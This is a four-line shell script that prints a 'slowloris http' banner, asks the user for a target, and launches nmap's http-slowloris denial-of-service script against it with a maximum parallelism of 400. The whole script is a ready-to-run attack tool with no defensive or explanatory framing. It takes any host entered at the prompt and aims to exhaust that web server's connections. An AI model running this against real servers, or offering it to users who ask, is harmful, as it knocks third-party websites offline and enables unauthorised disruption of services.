figlet slowloris http
echo " "
read -p "Target: " t
nmap --script http-slowloris --max-parallelism 400 $t

